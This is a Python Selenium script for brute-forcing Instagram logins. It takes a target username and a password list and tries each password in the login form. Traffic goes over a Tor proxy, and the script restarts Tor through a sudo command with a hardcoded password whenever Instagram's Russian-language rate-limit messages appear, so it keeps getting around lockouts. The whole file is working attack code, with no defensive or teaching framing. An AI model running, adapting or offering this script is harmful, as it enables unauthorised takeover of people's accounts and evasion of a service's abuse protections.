import os
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys

def wait(xPath, browser, time):
	elementWait = WebDriverWait(browser, time).until(EC.presence_of_element_located((By.XPATH, xPath)));
	return browser.find_element_by_xpath(xPath);

def checkCookies(xPathCokies, browser):
	try:
		cookies = wait(xPathCokies, browser, 3);
		cookies.click();
	finally:
		return 0;

def startBrowser(xPathCokies):
	PROXY = "socks5://localhost:9050";
	options = webdriver.ChromeOptions();
	options.add_argument('--proxy-server=%s' % PROXY);
	#options.add_argument('--incognito');
	browser = webdriver.Chrome(chrome_options=options);
	browser.get('https://www.instagram.com');
	checkCookies(xPathCokies, browser);
	return browser;

def dellCookies(browser):
	browser.get('chrome://settings/clearBrowserData');
	for i in range(7):
		browser.find_element_by_xpath('//settings-ui').send_keys(Keys.TAB);
	browser.find_element_by_xpath('//settings-ui').send_keys(Keys.ENTER);
	browser.get('https://www.instagram.com');
	
def main():
	result = "";
	count = 1;
	count_lines = 0;

	xPathCokies = '/html/body/div[2]/div/div/div/div[2]/button[1]';
	xPathUsername = '//*[@id="loginForm"]/div/div[1]/div/label/input';
	xPathPassword = '//*[@id="loginForm"]/div/div[2]/div/label/input';
	xPathLb = '//*[@id="loginForm"]/div/div[3]';
	xPathError = '//*[@id="slfErrorAlert"]';
	xPathDell = '//*[@id="clearBrowsingDataConfirm"]';

	username_string = input("Enter login: ");
	fileName = input("Enter password list: ");

	file_count = open(fileName);
	file = open(fileName);

	for temp in file_count:
		count_lines += 1;
	file_count.close();
	browser = startBrowser(xPathCokies);
	#dellCookies(browser);
	checkCookies(xPathCokies, browser);
	for line in file:
		print(line[:-1] + ' (' + str(count) + ';' + str(count_lines) +')');
		try:
			username = wait(xPathUsername, browser, 60);
			password = wait(xPathPassword, browser, 60);
			login_button = wait(xPathLb, browser, 60);
		except Exception:
			break;
		username.send_keys(username_string);
		password.send_keys(line);
		login_button.click();
		try:
			noLogin = wait(xPathError, browser, 60);
			count += 1;
			while noLogin.text == 'Не удалось подключиться к Instagram. Убедитесь в том, что вы подключены к Интернет, и попробуйте еще раз.' or noLogin.text == 'Подождите несколько минут, прежде чем пытаться снова.':
				sleep(120);
				os.system('echo 8364 | sudo -S killall -HUP tor');
				browser.refresh();
				checkCookies(xPathCokies, browser);
				username = wait(xPathUsername, browser, 60);
				password = wait(xPathPassword, browser, 60);
				login_button = wait(xPathLb, browser, 60);
				username.send_keys(username_string);
				password.send_keys(line);
				login_button.click();
				noLogin = wait(xPathError, browser, 60);
			if noLogin.text.find('Ваш аккаунт был заблокирован за нарушение наших условий:') != -1:
				result = line;
				break;
			browser.refresh();
			os.system('echo 8364 | sudo -S killall -HUP tor');
			checkCookies(xPathCokies, browser);
		except Exception as ex:
			print(ex);
			result = line;
			break;
	browser.close();
	if result != '':
		print(result);
	file.close();

if __name__ == "__main__":
	main();
